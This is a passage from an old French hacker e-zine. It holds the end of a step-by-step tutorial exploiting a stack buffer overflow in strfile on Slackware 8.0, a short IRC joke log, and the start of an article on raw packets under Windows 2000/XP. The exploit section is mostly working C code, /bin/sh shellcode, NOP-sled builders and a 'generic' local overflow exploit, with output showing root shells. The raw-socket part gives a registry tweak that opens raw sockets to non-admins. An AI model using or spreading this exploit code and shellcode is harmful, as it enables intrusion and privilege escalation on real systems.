Segmentation fault (core dumped)
[encoder@localhost test]$ gdb -c core.11024 -q
Core was generated by `./test2 BBBBBBBBBBBBBBBBBBBB AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb) quit

306 n'Θtant pas un multiple de 4, nous pouvons savoir qu'il est impossible  que
le eip soit correctement ΘcrasΘ avec un padding de la sorte.

[encoder@localhost test]$ ./test2 `perl -e 'print "B"x20'` `perl -e 'print "A"x300'`
Segmentation fault (core dumped)
[encoder@localhost test]$ gdb -c core.11032 -q
Core was generated by `./test2 BBBBBBBBBBBBBBBBBBBB AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAA'.
Program terminated with signal 11, Segmentation fault.
#0  0x42015800 in ?? ()
(gdb) quit

A 300 on ne retrouve pas nos  AAAA (41414141) c donc dire que nous  n'avons pas
rΘΘcrit eip.

[encoder@localhost test]$ ./test2 `perl -e 'print "B"x20'` `perl -e 'print "A"x304'`
Segmentation fault (core dumped)
[encoder@localhost test]$ gdb -c core.11040 -q
Core was generated by `./test2 BBBBBBBBBBBBBBBBBBBB AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAA'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb)

Ici α 304 nous  nous rendons compte que  nous avons effectivement rΘΘcrit  eip,
afin de  nous assurer  que nous  ne nous  sommes pas  trompΘ nous allons donner
comme argument un padding de  300 A et de 4  Z afin de s'assurer que  s'assurer
que les 4 derniers bytes de notre buffer overflow recouvre bien le eip.

[encoder@localhost test]$ ./test2 `perl -e 'print "B"x20'` `perl -e 'print "A"x300'`ZZZZ
Segmentation fault (core dumped)
[encoder@localhost test]$ gdb -c core.11743 -q
Core was generated by `./test2 BBBBBBBBBBBBBBBBBBBB AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
Program terminated with signal 11, Segmentation fault.
#0  0x5a5a5a5a in ?? ()
(gdb)

Operation successfull, on vient de trouver le eip. 



        ____         ,-------------------------------------------------
       /    \        |  Certain d'entre vous qui connaissent mal ou pas
      |  _   |       |  du tout GDB apprΘcieraient s√rement une petite 
      | / \  |       |  explication de ce qui c'est passΘ ici.
      ||   | |      /   
      (.) (.)|     /    
      ||   | |    <__   gdb est un programme disponible sur la plupart
      ||   | | |     |  des systΦmes d'exploitation qui permet de gΘrer
      ||   | | |     |  l'exΘcution de binary, daller lire les segments
      |____/|| |     |  de mΘmoires,  de  connaεtre  le  contenu   des 
      |\___/ | |     |  registre, d'exΘcuter un binary en traτant des
      ||   | | |     |  breakpoints afin de pouvoir dΘbuguer directement
      ||   | | |     |  certaines sections. gdb permet aussi d'obtenir des
      ||   | | |     |  dump en asm AT&T des diffΘrentes procΘdures et
      ||     | |        fonction d'un code donner, et peut mΩme dans le
      | \___/  |        cas d'un programme compilΘ spΘcifiquement pour
      |        |        gdb de prΘsenter le code original en C α partir
       \______/         du binary.       
       
                        Un   article   entier   pourrais   Ωtre   consacrΘ    α
                        l'utilisation de  gdb, comme  il ne  s'agit pas  du but
                        recherchΘ ici, je vais me contenter de survoler ce  qui
                        est nΘcessaire pour comprendre cette article et  parler
                        de  quelques  commandes de  base  qui peuvent  s'avΘrer
                        intΘressantes.

                        
                        afin  d'utiliser  gdb  pour  gΘrer  un  programme   qui
                        segfault, il faut crΘer un core au moment du  segfault.
                        c'est  ce  core  que  nous  utiliserons  via  gdb  pour
                        "debugger" notre application. pour faire crΘer un  core
                        il suffit de faire la commande 
                        
                        ulimit -c 100000 
                        
                        (ce n'est  pas nΘcessaire  de la  refaire avant  chaque
                        exΘcution, une fois suffit, tant que vous demeurez dans
                        le mΩme  shell). pour  lancer gdb  avec un  coredump il
                        suffit de lancer la commande suivante                        
                        
                        gdb -c core 
                        
                        (ici   core   peu   prΘsenter   quelques    diffΘrences
                        dΘpendamment  du  os  ou mΩme  de  la  distro que  vous
                        utiliser. par  exemple sous  slackware la  dΘnomination
                        est simplement core  tandis que sous  redhat un id  est
                        ajoutΘ en extension  ce qui donne core.10045 (genre).

                        
                        Une autre faτon est de lancer gdb avec le programme 
                        a dΘbuguer en paramΦtre, ex:
                        
                        gdb test 
                        
                        
                        Ensuite α l'intΘrieur de  gdb il suffit de  taper"r" ou
                        "run" pour que l'application s'exΘcute. Il est possible
                        de passer  des paramΦtres,  de la  mΩme faτon  que vous
                        feriez si  vous lanceriez  le programme  α partir  d'un
                        shell. C-a-d  que vous  tapez r  suivit des  arguments.
                        Encore la comme dans un shell il est possible d'insΘrer
                        des  rΘsultats de  commande en  argument α  l'aide des
                        balises ``.

                        Vous   aurez   s√rement   remarquΘ   l'utilisation   de
                        l'option -q  au dΘmarrage  de gdb.  Cette option enlΦve
                        simplement le header de gdb (du text pas trop important
                        et trΦs redondant α la longue).
                        
                        
                        Pour de l'aide, taper help, (classique)
                        
                        Quelques autres commandes vous serons s√rement utile
                        
                        p (print) : permet de printer la valeur d'un registre
                        
                        
                        ex : p $eip 
                        
                        donnera la valeur de eip. noter que pour l'utilisation
                        de "p" le registre mit en option doit Ωtre dΘbuter par
                        le caractΦre $.
                        
                        
                        info registers : donne la liste et la valeur de chaque
                                         registre
                                       
                        
                        disassemble : permet de donner un dump asm d'une 
                        	      procΘdure ou d'une fonction
                        	      
                        ex : disassemble main
                        
                        donnera le code en asm de votre fonction main
                        
                        
                        	       
                        x/12 : permet  d'afficher  le  contenu  hexadΘcimal  de 
                               la mΘmoire en diviser en section de 12 groupe de
                               4  bytes,  faire  enter  pour  remonter  dans la
                               mΘmoire.  x/12  a  besoin  comme  paramΦtre  une
                               adresse hexadΘcimal de ou commencer α lire.
                               
                               
                        ex : (gdb) x/12 0xbffff830
                        
                        
                        donnera un rΘsultat qui ressemble a ceci 
                               
     0xbffff830:     0x00000000      0xbffff874      0xbffff884      0x400124b8
     0xbffff840:     0x00000003      0x080482ac      0x00000000      0x080482cd
     0xbffff850:     0x0804835c      0x00000003      0xbffff874      0x08048254
                           
                        
                        O∙ la premiΦre colonne reprΘsente l'adresse hexadΘcimal
                        de la premiΦre bytes de la 2iΦme colonne. (0x stand for
                        hexadecimal use).
                        
                        
Et maintenant, passont α la pratique.

Comme dit prΘcΘdemment, le  but de cette article  est de crΘer un  exploit pour
strfile sous linux  slackware 8.0 .   La  premiΦre  Θtape   est  de trouver  la
grandeur du buffer exploitable. Pour ce faire, vu que nous ne disposons pas  du
source code,  nous procΘderons  par un  petit bruteforce.  Pour ce  faire, nous
n'utiliserons pas la commande de perl montrer plus haut, mais un petit tool  en
C qui fait exactement la mΩme chose, en moins long α taper. 


//pad.c  
//use it to find the buffer lenght
#include &lt;stdio.h>

main(int argc,char* argv[]) {
        int x;
        if (argc > 1)
        {
        // A X nbr argument(argv[1]) (perl -e 'print "A"x300') (0x42)
                for (x=0;x&lt;atoi(argv[1]);x++)
                        printf("B");
        }
        // ret (%eip = 0x41414141)
        printf("AAAA");
}


Ce code output un nombre  de B qu'on passe en  argument et ajoute 4 A  α la fin
(ainsi si on voit un 42 dans le  eip, on sait que notre buffer est trop  grand.
Donc au lieu de faire :


strfile `perl -e 'print "B"x5000'`AAAA


Il suffit de faire


strfile `./pad 5000`


Vous comprendrez que j'ai compilΘ mon  code sous le nom de pad  (pour padding).
avec 5000 de  padding on tombe  sur un segmentation  fault, ce qui  nous laisse
permettre  croire qu'on  a rΘΘcrit   eip,  sauf  que l'adresse  qu'on a  ajoutΘ
pointe vers rien  d'exΘcutable. avec un  pad de 4000  strfile ne segfault  pas.
avec la mΘthode d'essaie et erreur, nous pouvons arriver a un padding de 4148.


root@Rewter:~/tool# ulimit -c 10000
root@Rewter:~/tool# strfile `./pad 4148`
Segmentation fault (core dumped)
root@Rewter:~/tool# gdb -c core -q
Core was generated by `strfile BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb)


On voit ici que eip a ΘtΘ ΘcrasΘ par nos 4 A. nous avons donc la bonne grandeur
de  buffer,  il ne  nous  reste plus  qua  construire un  exploit.  La premiΦre
question a se pauser aprΦs avoir su la grandeur de notre buffer c'est qu'est-ce
qu'on va mettre dedans ? voici un petit graphique qui reprΘsente ce a quoi aura
l'air notre buffer un coup fini.


,----------------------------------------,-------------------,-------------,
|                                        |                   |             |
| nop(0x90)(4148 - shellcode - eip bytes)| shellcode(X bytes)| eip(4bytes) |
'________________________________________'___________________'_____________'



nop(0x90) : il s'agit d'un code hexadΘcimal (0x90) qui signifie en  assembleur,
            passe au suivant.  nous nous en  servons pour remplir  notre buffer
            afin  d'avoir une  zone plus  ou moins  grande dans  la quel  nous
            pourrons jumper. Bref  on se garde  une marge de  man£uvre dans les
            adresse  sur  lesquels nous  pouvons  jumper (eip)  pour  que notre
            exploit  s'exΘcute  sans  erreur. Peu  importe  ou  nous jumpons  a
            l'intΘrieur du padding de nop, nous sommes sur d'en arriver a notre
            shellcode.
	  
	  
shellcode : le  shellcode  est  une  suite  dinstruction  en   assembleur   qui 
            exΘcute un shell, soit  /bin/sh dans la plus  par des cas. Dans  le
            cas d'un  exploit root,  on doit  aussi rajouter  un petit  code en
            assembleur qui fait l'Θquivalent de  "set uid 0". Des shellcode  on
            ΘtΘ Θcrit  pour les  diffΘrentes architecture  existante, nous nous
            contenterons d'en copier un dΘjα fait. comme notre exploit se  fait
            en local,  nous n'avons  pas a  nous inquiΘter  qu'un ids  perτoive
            notre shellcode  dans une  suite de  packet. (la  plus par  des ids
            block  les  exploits  en  reconnaissant  les  diffΘrents shellcodes
            existant, pour bypasser cette dΘfense il est possible de construire
            les shellcode polymorphique. mais  comme nous sommes en  local nous
            n'en  traiteront pas  dans cet  article. connaεtre  la grandeur  de
            notre shellcode  n'est pas  particuliΦrement important,  puisque le
            code de notre exploit  gΘrera tout ceci. il  est bon de savoir  par
            contre que au minimum notre exploit doit Ωtre plus petit de 4 bytes
            que  la   grandeur  total   du  buffer   exploitable,  mais  jumper
            directement  au dΘbut  d'un shellcode  est en  soit exploit,  c'est
            pourquoi nous  utilisons des  nop pour  complΘter le  buffer. voici
            tout de mΩme un petit code en C qui permet de calculer la  grandeur
            du shellcode que nous utiliserons. (ou de tout autre)
	    


//length.c
//use to output the shellcode len    
#include &lt;stdio.h>
main(int argc,char*argv) {

        char shellcode[] =
                "\x33\xc0\x31\xdb\xb0\x17\xcd\x80"
                "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3"
                "\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

        printf("lenght of %d\r\n", strlen(shellcode));
}



root@Rewter:~/tool# gcc length.c -o len
root@Rewter:~/tool# ./len
lenght of 32


  
	     Nous savons maintenant  que notre shellcode  a une grosseur  de 32
	     bytes. Nous pouvons donc assumer avec certitude qu'il nous  faudra
	     4112 bytes  de nop  pour complΘter  notre buffer  (il ne  faut pas
	     oublier que l'adresse qui rΘΘcrit eip prend 4bytes).

	     
	     
eip : C'est dans les 4 bytes du eip que se  trouve  l'adresse  de  retour.   Il
      nous faut donc trouver une adresse mΘmoire au milieu de nos nop. pour  ce
      faire nous utiliserons gdb et un petit code en c qui ressemble beaucoup a
      notre code de padding, sauf que au lieu de crΘer des A il crΘer des nop.  
      
      
//nop.c
//padding de nop dans un buff      
#include &lt;stdio.h>

main(int argc,char* argv[]) {
        int x;
        if (argc > 1)
        {
        // 0x90 X nbr argument(argv[1]) (perl -e 'print "A"x300') (0x42)
                for (x=0;x&lt;atoi(argv[1]);x++)
                        printf("\x90");
        }
}
    
    
    

root@Rewter:~/tool# strfile `./nop 4148`
Segmentation fault (core dumped)
root@Rewter:~/tool# gdb -c core -q
Core was generated by `strfile ???????????????????????????????????????????????????????????????????????'.
Program terminated with signal 11, Segmentation fault.
#0  0x804b674 in ?? ()
(gdb) p $ebp
$1 = (void *) 0xbfffe968
(gdb) x/12 0xbfffe968

          
On print ebp pour retourner au dΘbut du frame de notre fonction. et a laide  de
x/12 on imprime le contenu hexadΘcimal de la mΘmoire a partir de cette endroit,
il suffit  de faire  quelques enters  pour trouver  une adresse  α laquelle  on
retrouve un nop :
          
      
(gdb)
0xbfffeae8:     0x00000000      0x0000000e      0x00000000      0x0000000f
0xbfffeaf8:     0xbfffeb1b      0x00000000      0x00000000      0x00000000
0xbfffeb08:     0x00000000      0x00000000      0x00000000      0x00000000
(gdb)
0xbfffeb18:     0x69000000      0x00363836      0x66727473      0x00656c69
0xbfffeb28:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffeb38:     0x90909090      0x90909090      0x90909090      0x90909090
(gdb)
0xbfffeb48:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffeb58:     0x90909090      0x90909090      0x90909090      0x90909090
0xbfffeb68:     0x90909090      0x90909090      0x90909090      0x90909090


On reconnaεt ici no  90 (0x90) qui reprΘsente  des nop, n'importe quel  adresse
dans  ce range  pourrais servire  pour notre  buffer overflow,  nous allons  en
prendre une vers le dΘbut,  pour Ωtre sur de ne  pas jumper au milieu de  notre
shellcode (dans le cas  de strfile avec un  buffer de 4148 bytes  le danger est
pas Θnorme, mais ne prenons pas  de risque par principe). ici par  exemple nous
pourrions choisir l'adresse bfffeb58.


Une autre faτon de calculer l'adresse est  de le faire faire par un petit  code
en C. 



//offset.c
//calcul le ret et ajuste avec l'aide de l'offset
#include &lt;stdio.h>


unsigned long getesp()
        {
        __asm__("movl %esp, %eax");
        }


main(int argc, char* argv[])
        {
        unsigned long esp;
        char* ret;

        esp = getesp();
        if (argc > 1)
                esp += atoi(argv[1]);


        ret = &esp;
        printf("%c%c%c%c",ret[0],ret[1],ret[2],ret[3]);
        }



Maintenant que nous avons  la possibilitΘ de rΘΘcrire  le eip avec une  adresse
qui jumpera au  dΘbut de notre  buffer. l'offset est  un nombre qu'on  passe en
argument que l'exploit  addition a l'adresse  hexadΘcimal afin de  permettre un
peu de souplesse a l'exploit. de petite variation pouvant arriver d'un  systΦme
a l'autre il est  toujours pratique d'avoir la  chance de jumper a  une adresse
plus haute en mΘmoire. Nous sommes  maintenant prΩt α bΓtir un buffer  que nous
copierons dans un  tird part text,  dont nous nous  servirons comme argument  α
passer α strfile. 


Dans un premier temps  il nous faudra un  code qui output notre  shellcode pour
ensuite le passer en  argument α un programme  qui assemblera nop shellcode  et
eip. 


//shellcode.c
//print le shellcode pour le passer en arguement

#include &lt;stdio.h>

        char shellcode[] =
                "\x33\xc0\x31\xdb\xb0\x17\xcd\x80"
                "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3"
                "\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

main()
        {
        printf("%s",shellcode);

        }




//build_buf.c
//assemble le buffer (nop + shellcode + ret (eip)
#include &lt;stdio.h>


main(int argc, char* argv[])
        {
        int buffer_size;
        char* shellcode;
        char* ret;
        int x,y;

        if (argc > 3)
                {
                buffer_size = atoi(argv[1]);
                shellcode = argv[2];
                ret = argv[3];
                x = buffer_size;
                x -= strlen(shellcode);
                for (y=0;y&lt;x;y++)
                        printf("\x90");
                printf("%s",shellcode);
                printf("%s",ret);

                }
                else
                {
                printf("USAGE: ./build_bof BUFFER_SIZE SHELLCODE RET\r\n");

                }
        }



root@Rewter:~/tool# ./build_bof 4148 `./shellcode` `./offset` > buf
root@Rewter:~/tool# strfile `cat buf`
sh-2.05#

Tadam  on vient  de rΘussir  un buffer  overflow. nous  n'avons pas  eu  besoin
d'offset, mais jumper α l'intΘrieur d'une zone de 4148 bytes est quelque  chose
d'assez facile α faire. ce n'est pas l'espace qui manque.


Noter que strfile ne possΦde pas de suid root, donc l'exploit ne donnera pas le
root, il va seulement conserver les  privilΦges que vous avez dΘjα. ici  je lai
lancer  root,  c'est  pourquoi  je suis  root.  cependant  il  n'existe pas  de
diffΘrence au  niveau code  pour exploiter  un programme  suid 0 d'un programme
non-suid 0.


Maintenant que nous avons une vague  idΘe de ce a quoi notre  exploit ressemble
nous  allons  en  bΓtir  un  static  pour  strfile.  qui  sera  compilable   et
distribuable.
 

//mkd_strfile.c
//exploit static pour slackware 8.0 strfile (bsdgame package)
#include &lt;stdio.h>


//location du bin a exploiter
#define PATH "/usr/bin/strfile"
//grandeur du buffer total
#define BUFFER 4148
//addresse de retour (pour ecraser eip)
#define RET "\xbf\xff\xeb\x58"

main (int argc,char* argv[])
        {
        char shellcode[] =
                "\x33\xc0\x31\xdb\xb0\x17\xcd\x80"
                "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3"
                "\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

        char nop[] = "\x90";
        int x;
        char* payload;

	//creation du padding de nop
        for (x=1;x&lt;BUFFER - strlen(shellcode) - 4;x++)
                {
                strcat(payload,nop);
                }	

		
                printf ("nop in bytes : %d\r\n",strlen(payload));
                //ajout du shellcode
		strcat(payload,shellcode);
		printf ("nop + shellcode in bytes : %d\r\n",strlen(payload));
                //ajour du ret
		strcat(payload,RET);
                printf ("nop + shellcode + ret in bytes : %d\r\n",strlen(payload));


		//execution de l'exploit
                execl(PATH, "strfile", payload, NULL);
        }



Il nous reste  donc plus qua  tester notre exploit.  L'exΘcution de /bin/sh  se
fait  bien,  nous  avons donc  rΘussi  α  crΘer un  exploit  pour  strfile sous
slackware 8.0 

root@Rewter:~/tool# gcc mkd_strfile.c -o mkd_strfile
root@Rewter:~/tool# ./mkd_strfile
nop in bytes : 4112
nop + shellcode in bytes : 4144
nop + shellcode + ret in bytes : 4148
sh-2.05#



Maintenant que nous avons notre exploit strfile, il serait intΘressant de crΘer
un exploit gΘnΘrique  qui permet d'exploiter  n'importe quelle buffer  overflow
local. He bien, dans mon immense gΘnΘrositΘ j'ai codΘ cette exploit. Le voici : 


#include &lt;stdio.h>
#include &lt;stdlib.h>


unsigned long getesp()
	{
	__asm__("movl %esp, %eax");
	}


main(int argc, char* argv[]) 
	{
	int buffer_size, i;
	char shellcode[] =
		"\x33\xc0\x31\xdb\xb0\x17\xcd\x80"
		"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3"
		"\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
	char nop[] = "\x90";
	char* path;
	char* buff;
	char* payload;
	char* redhat;

	unsigned long ret;
	if (argc > 4) 
		{

		/*definition des variable*/
		path = argv[1];
		buffer_size = atoi(argv[2]);
		redhat = argv[4];
		/*mettre laddresse memoir de %esp dans esp*/
		ret = getesp();

                /*calcule du ret*/
                ret += atoi(argv[3]);


		buff = malloc(4096);
		payload = buff;


		/*padding du payload*/
		if (*redhat == 'n') 
                        {
                        	for (i=0;i&lt;buffer_size-strlen(shellcode)-strlen(ret);i++)
                        		strcat(&payload[0], nop);
                        }
		else 
                        {
                        	for (i=0;i&lt;buffer_size-strlen(shellcode)-strlen(ret)+4;i++)
                        		strcat(&payload[0], nop);
                        }

		/*ajout du shellcode au payload*/
		strcat (&payload[0], shellcode);	

		
		/*ajout du ret au payload*/
	 	strcat (&payload[0], ret);

		/*execution de lexploit*/
		if (argc > 5) 
                        {
                        printf("trying to exploit %s %s\n", &path[0], argv[5]);
                        }
		else 
                        {
                        printf("trying to exploit %s\n", &path[0]);
                        }
		printf("a buffer of %d\n", buffer_size);
		printf("using a shellcode of %d\n", strlen(shellcode));
		printf("with a padding of %d\n", buffer_size-strlen(shellcode)-4);

		printf("and an offset of %d\n", atoi(argv[3]));

		printf("jumping to 0x%x\n", ret);
		printf("payload lenght %d\n", strlen(payload));

		if (argc > 5) 
                        {
                        execl(path, "genericbuf", argv[5], payload, NULL);
                        }
		else
                        {
                        execl(path, "genericbuf", payload, NULL); 
                        }
		} 
	else
		{
		printf("usage is ./buf_generic_x86 path_to_vuln buffer_size offset redhat_flag(y/n) [argument]\n");
		}
	}

                        
                        
Ce code prend en compte les 4 bytes de trop sous un systΦme red hat, pour  vous
montrez son fonctionnement j'exploiterais strfile α nouveau. Mais en  utilisant
buf_generic_x86 au lieu de mkd_strfile 

root@Rewter:~/tool# ./buf_generic_x86
usage is ./buf_generic_x86 path_to_vuln buffer_size offset redhat_flag(y/n) [argument]
root@Rewter:~/tool# ./buf_generic_x86 /usr/bin/strfile 4148 0 n
trying to exploit /usr/bin/strfile
a buffer of 4148
using a shellcode of 32
with a padding of 4112
and an offset of 0
jumping to 0xbffff94c
payload lenght 4148
sh-2.05#


Et pour la 3iΦme fois dans cet article, nous avons rΘussi α exploiter  strfile.
comme vous avez pu remarquer, il existe plus qu'une faτon d'arriver a exploiter
un buffer  overflow local.  J'espΦre que  ce texte  vous aura  apporter quelque
chose ne serais-ce que le buf_generic.c  si vous saviez deja faire des  buffers
overflow.  sinon,  he bien,  peu  Ωtre aurez  vous  trouvez le  complΘment  qui
manquais au doc existant pour arriver α votre fin. 


Greets : __2 avec qui j'ai construit les tools en C qui permettent de crΘer  un 
buffer dans un file. 


                                                		   Wyzeman



            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /                wyzeman@mindkind.org                     /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'



   < Mindkind tales from IRC >
   
  [13:43] &lt;init_null> la mere a last en show dans mindkind
  [13:43] &lt;init_null> tutoriel sur comment mettre au monde un geek
  [13:44] &lt;init_null> education 101
  [13:44] &lt;Wyzeman> how to stuff your geek
  [13:44] &lt;Wyzeman> feed the geek
  [13:44] &lt;LastCall_> hahahaha
  [13:44] &lt;init_null> comment faire le menage de la chambre de votre geek
  [13:44] &lt;LastCall_> HAHAHAHA
  [13:44] &lt;Wyzeman> votre geek et la sexualiter
  [13:45] &lt;init_null> cours accΘlΘrer sur les relations sexuelles hors-irc
  
  < ----------------------- >


                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.10 Comment sender des packets RAW sous windows 2k/XP\        \     !
     .             aka                                         \        \    .
     ;       ginette ginette, laisse moi entrer dans ton socket \        \   :
     :                                                           \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\
                                                   


ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐
⌐                      AVERTISSEMENT                       ⌐
ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐
ñ Cet article est destinΘ α ceux et celles qui savent dΘjα ñ
⌐  utiliser les sockets, qui ont une bonne base en TCP/IP  ⌐
ñ qui connaissent les principes des raw sockets de base et ñ
⌐                      le language C.                      ⌐
ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐

------------------------------------------------------------

ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐
⌐                      INTRODUCTION                        ⌐
ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐

Bonjour,

si vous avez continuΘ α lire malgrΘ le petit  avertissement,
c'est signe que vous savez dΘjα l'utilitΘ des raw sockets au
delα du simple SYN flood. Je vais donc vous Θpargner l'intro
et commencer tout de suite le c⌠tΘ intΘressant.

Dans  cet  article  je   ne  vais  pas  parler   des  autres
possibilitΘs avec  les raw  sockets, comme  par  exemple  de
pouvoir "sniffer" les packets  qui entrent et sortent  d'une
box. Je vais me concentrer sur l'envoi de packets raw.


ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐
⌐                   LE SOCKET LUI-M╩ME                     ⌐
ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐

Pour commencer,  vous devez  absolument Ωtre  administrateur
sur  la box  o∙ vous  voudrez faire  des raw  sockets. Seul
l'admin a les droits pour les utiliser. └ moins de crΘer une
clΘ  dans  votre  registre,  qui  permettrait  α  tout   les
utilisateurs  de s'en  servir. CrΘez  la clΘ  ci-dessous et
settez sa valeur qui est de type DWORD α 1.

HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Afd\Parameters\DisableRawSecurity

Vous aurez aussi besoin d'un header "custom" pour setter vos
header TCP et IP.  J'en ai inclus un  α la fin de  l'article
sous le chapitre "HEADER  └ UTILISER". Je tient  toutefois α
mentionner que  je n'ai  PAS programmΘ  le header.  Il a ΘtΘ
fait par "ziss".

Les autres headers dont vous aurez besoin sont  &lt;winsock2.h>
et  &lt;ws2tcpip.h>. N'oubliez  pas d'inclure  la librairie  de
winsock2 "ws2_32.lib".  Personellement je  suggΦre, si  vous
utilisez MS visual C++, d'utiliser la petite commande:

	#pragma comment(lib, "ws2_32.lib");

La dΘclaration d'un socket  "normal" ou de type  SOCK_STREAM
ou SOCK_DGRAM est simple:

	SOCKET sock;
	socket(AF_INET, SOCK_STREAM, 0);

Pour la dΘclaration d'un raw socket, quelques petites choses
diffΦrent. Voici un exemple:

	SOCKET sock;
	socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

J'attire votre attention sur le SOCK_RAW, qui est le type de
socket, et  sur IPPROTO_RAW  qui est  le protocole  qui sera
utilisΘ par le socket.

Il est important de configurer notre socket pour qu'il  soit
"vraiment" raw. Nous faisons τa de cette faτon:

	BOOL bOpt = TRUE;
	setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&bOpt, 
sizeof(bOpt));

Votre  socket est  maintenant raw  et prΩt  α Ωtre  utilisΘ.
Notez que  pour utiliser  IP_HDRINCL, vous  devez absolument
Ωtre en administrateur ou bien  avoir mit la petite clΘ  que
j'ai mentionnΘe plus haut.

ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐
⌐                    LES HEADERS TCP/IP                    ⌐
ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐ñ⌐

Je ne vais pas m'attarder α l'explication des headers TCP/IP
puisque je crois que pas mal  tout le monde ont dΘjα lu  sur
le sujet. Un packet contient toute les informations qu'il  α
besoin pour se diriger sur l'internet. Il contient l'adresse
du destinataire, celle de  l'envoyeur et autre choses  comme
la version IP, la grandeur  du packet, le checksum, le  port
de  l'envoyeur  et  du  destinataire,  etc.  Si  vous   Ωtes
intΘressΘs α en savoir plus sur les headers TCP/IP ou sur le
TCP/IP lui-mΩme, je vous  suggΦre de jeter un  oeil attentif
sur le rfc1180.

Les headers  TCP/IP seront  facilement configurable  avec la
librairie "tcpip.h" fournie  α la fin  de cet article.  Pour
vous donner une idΘe, je vais faire les headers TCP et IP.

	IP_HDR	ipHeader;

	ipHeader.ip_checksum	= 0;
	ipHeader.ip_id		= 1;
	ipHeader.ip_offset	= 0;
	ipHeader.ip_protocol	= IPPROTO_TCP;
	ipHeader.ip_tos		= 0;
	ipHeader.ip_totallength	= htons(iSize); // iSize = sizeof(ipHeader) + sizeof(tcpHeader);
